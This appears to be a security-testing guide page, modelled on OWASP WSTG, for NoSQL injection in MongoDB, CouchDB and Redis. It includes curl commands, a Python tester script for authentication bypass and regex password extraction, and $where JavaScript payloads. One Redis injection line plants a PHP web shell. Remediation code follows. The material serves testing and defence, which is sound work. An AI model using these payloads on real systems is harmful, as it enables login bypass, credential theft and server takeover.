# WSTG-INPV-05.6: Testing for NoSQL Injection

## Test ID
WSTG-INPV-05.6

## Test Name
Testing for NoSQL Injection

## High-Level Description

NoSQL injection targets NoSQL databases (MongoDB, CouchDB, Redis, etc.) where traditional SQL injection techniques don't apply. These databases use different query languages and data structures, but are still vulnerable to injection attacks through JSON payloads, JavaScript execution, and operator manipulation.

---

## What to Check

- [ ] MongoDB operator injection ($gt, $ne, $regex)
- [ ] JSON injection in queries
- [ ] JavaScript execution (server-side)
- [ ] Authentication bypass
- [ ] Array/object injection
- [ ] Redis command injection

---

## How to Test

### Step 1: NoSQL Injection Detection

```bash
#!/bin/bash
TARGET="https://target.com/api/login"

echo "[*] Testing for NoSQL injection..."

# MongoDB operator injection
curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d '{"username":{"$ne":""},"password":{"$ne":""}}'

# Array injection
curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":{"$gt":""}}'

# Regex injection
curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d '{"username":{"$regex":"^admin"},"password":{"$ne":""}}'

# URL parameter injection
curl -s "$TARGET?username[\$ne]=&password[\$ne]="
```

### Step 2: NoSQL Injection Tester

```python
#!/usr/bin/env python3
"""
NoSQL Injection Vulnerability Tester
Supports MongoDB, CouchDB, and general NoSQL patterns
"""

import requests
import json
import re

class NoSQLInjectionTester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()

    # MongoDB operator payloads
    MONGODB_PAYLOADS = {
        'auth_bypass': [
            {"username": {"$ne": ""}, "password": {"$ne": ""}},
            {"username": {"$gt": ""}, "password": {"$gt": ""}},
            {"username": "admin", "password": {"$ne": ""}},
            {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
            {"username": {"$in": ["admin", "administrator"]}, "password": {"$ne": ""}},
        ],
        'data_extraction': [
            {"$where": "this.username == 'admin'"},
            {"$where": "function(){return true}"},
            {"username": {"$regex": "^a"}},
            {"username": {"$regex": "^admin"}},
        ],
        'operator_injection': [
            {"$or": [{"username": "admin"}, {"username": "user"}]},
            {"$and": [{"username": {"$ne": ""}}, {"password": {"$ne": ""}}]},
        ],
    }

    # JavaScript injection payloads
    JS_PAYLOADS = [
        "'; return true; var x='",
        "'; return this.password; var x='",
        "1'; return true; '",
        "1 || 1==1",
        "this.password.match(/.*/)//",
    ]

    def test_mongodb_auth_bypass(self):
        """Test MongoDB authentication bypass"""
        print("\n[*] Testing MongoDB authentication bypass...")

        for payload in self.MONGODB_PAYLOADS['auth_bypass']:
            try:
                response = self.session.post(
                    self.url,
                    json=payload,
                    headers={'Content-Type': 'application/json'}
                )

                # Check for successful bypass indicators
                if response.status_code == 200:
                    try:
                        resp_json = response.json()
                        if 'token' in resp_json or 'session' in resp_json or 'success' in resp_json:
                            print(f"[VULN] Auth bypass possible!")
                            print(f"  Payload: {json.dumps(payload)}")
                            self.findings.append({
                                'type': 'MongoDB Auth Bypass',
                                'payload': payload,
                                'severity': 'Critical'
                            })
                            return True
                    except:
                        if len(response.text) > 100:
                            print(f"[WARN] Potential auth bypass")
                            print(f"  Payload: {json.dumps(payload)}")

            except Exception as e:
                pass

        return False

    def test_url_parameter_injection(self):
        """Test NoSQL injection via URL parameters"""
        print("\n[*] Testing URL parameter injection...")

        payloads = [
            "username[$ne]=&password[$ne]=",
            "username[$gt]=&password[$gt]=",
            "username[$regex]=.*&password[$regex]=.*",
            "username=admin&password[$ne]=",
        ]

        base_url = self.url.split('?')[0]

        for payload in payloads:
            try:
                response = self.session.get(f"{base_url}?{payload}")

                if response.status_code == 200 and len(response.text) > 50:
                    print(f"[WARN] Potential injection via URL params")
                    print(f"  Payload: {payload}")
                    self.findings.append({
                        'type': 'URL Parameter NoSQL Injection',
                        'payload': payload,
                        'severity': 'High'
                    })

            except Exception as e:
                pass

    def test_javascript_injection(self):
        """Test JavaScript injection ($where, mapReduce)"""
        print("\n[*] Testing JavaScript injection...")

        for js_payload in self.JS_PAYLOADS:
            # Test in $where clause
            payload = {"$where": js_payload}

            try:
                response = self.session.post(
                    self.url,
                    json=payload,
                    headers={'Content-Type': 'application/json'}
                )

                # Check for execution indicators
                if response.status_code == 200:
                    print(f"[INFO] JS payload accepted: {js_payload[:40]}")

                # Check for errors that confirm MongoDB
                if 'SyntaxError' in response.text or 'ReferenceError' in response.text:
                    print(f"[INFO] MongoDB JavaScript error detected")

            except Exception as e:
                pass

    def test_regex_extraction(self):
        """Test data extraction via regex injection"""
        print("\n[*] Testing regex-based data extraction...")

        # Character-by-character extraction
        charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
        extracted = ""

        for i in range(20):  # Extract up to 20 characters
            found = False
            for char in charset:
                payload = {
                    "username": "admin",
                    "password": {"$regex": f"^{extracted}{char}"}
                }

                try:
                    response = self.session.post(
                        self.url,
                        json=payload,
                        headers={'Content-Type': 'application/json'}
                    )

                    # If response indicates success
                    if response.status_code == 200 and ('token' in response.text.lower() or
                        'success' in response.text.lower()):
                        extracted += char
                        found = True
                        print(f"  Extracted: {extracted}")
                        break

                except Exception as e:
                    pass

            if not found:
                break

        if extracted:
            print(f"[VULN] Regex extraction successful: {extracted}")
            self.findings.append({
                'type': 'NoSQL Regex Data Extraction',
                'extracted': extracted,
                'severity': 'Critical'
            })

    def test_array_injection(self):
        """Test array/object injection"""
        print("\n[*] Testing array/object injection...")

        payloads = [
            {"username": ["admin", "user"], "password": {"$ne": ""}},
            {"username": {"$in": ["admin"]}, "password": "test"},
            {"username": "admin", "password": ["", {"$ne": ""}]},
        ]

        for payload in payloads:
            try:
                response = self.session.post(
                    self.url,
                    json=payload,
                    headers={'Content-Type': 'application/json'}
                )

                if response.status_code == 200:
                    print(f"[INFO] Array injection accepted")

            except Exception as e:
                pass

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("NOSQL INJECTION REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo NoSQL injection vulnerabilities confirmed.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                if 'payload' in f:
                    print(f"  Payload: {json.dumps(f['payload'])[:70]}")
                if 'extracted' in f:
                    print(f"  Extracted: {f['extracted']}")

    def run_tests(self):
        """Run all NoSQL injection tests"""
        self.test_mongodb_auth_bypass()
        self.test_url_parameter_injection()
        self.test_javascript_injection()
        self.test_array_injection()
        # self.test_regex_extraction()  # Uncomment for active extraction
        self.generate_report()

# Usage
tester = NoSQLInjectionTester("https://target.com/api/login")
tester.run_tests()
```

### Step 3: Database-Specific Payloads

```javascript
// MongoDB Payloads

// Authentication Bypass
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "admin"}, "password": {"$ne": ""}}

// $where JavaScript Injection
{"$where": "1 == 1"}
{"$where": "function() { return true; }"}
{"$where": "this.password.length > 0"}

// $regex Data Extraction
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
// Continue character by character

// Operator Injection
{"username": "admin", "password": {"$type": 2}}  // Type 2 = string
{"username": {"$exists": true}, "password": {"$exists": true}}
```

```python
# CouchDB Payloads
# URL-based injection
GET /db/_find?selector={"username":"admin","password":{"$regex":".*"}}

# Mango query injection
{"selector": {"username": "admin", "password": {"$gt": ""}}}
```

```bash
# Redis Command Injection
# If user input is concatenated into Redis commands

# EVAL command injection
EVAL "return redis.call('keys','*')" 0

# Newline injection
SET user "test\r\nCONFIG SET dir /var/www/html\r\nCONFIG SET dbfilename shell.php\r\nSET payload '<?php system($_GET[cmd]); ?>'\r\nSAVE"
```

---

## Tools

| Tool | Purpose |
|------|---------|
| NoSQLMap | Automated NoSQL injection |
| Burp Suite | Manual testing |
| mongosh | MongoDB client |
| redis-cli | Redis client |

---

## Remediation

```javascript
// Node.js/MongoDB - Input validation
const mongoose = require('mongoose');

// Sanitize input - remove $ operators
function sanitize(obj) {
    if (typeof obj === 'object') {
        for (let key in obj) {
            if (key.startsWith('$')) {
                delete obj[key];
            } else {
                sanitize(obj[key]);
            }
        }
    }
    return obj;
}

// Use parameterized queries
async function findUser(username, password) {
    // Type checking
    if (typeof username !== 'string' || typeof password !== 'string') {
        throw new Error('Invalid input types');
    }

    return await User.findOne({
        username: username,
        password: hashPassword(password)
    });
}

// mongo-sanitize library
const sanitize = require('mongo-sanitize');
const cleanInput = sanitize(userInput);
```

```python
# Python/PyMongo
from bson import ObjectId
import re

def sanitize_input(data):
    """Remove MongoDB operators from input"""
    if isinstance(data, dict):
        return {k: sanitize_input(v) for k, v in data.items()
                if not k.startswith('$')}
    elif isinstance(data, list):
        return [sanitize_input(item) for item in data]
    return data
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| NoSQL auth bypass | 9.8 | Critical |
| JavaScript injection ($where) | 9.1 | Critical |
| Regex data extraction | 7.5 | High |
| Operator injection | 7.5 | High |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-943** | Improper Neutralization of Special Elements in Data Query Logic |

---

## References

- [OWASP NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/)
- [MongoDB Security](https://docs.mongodb.com/manual/security/)
- [PayloadsAllTheThings - NoSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

---

## Checklist

```
[ ] MongoDB operator injection tested
[ ] URL parameter injection tested
[ ] JavaScript injection tested
[ ] Array/object injection tested
[ ] Regex extraction tested
[ ] Authentication bypass tested
[ ] Findings documented
```
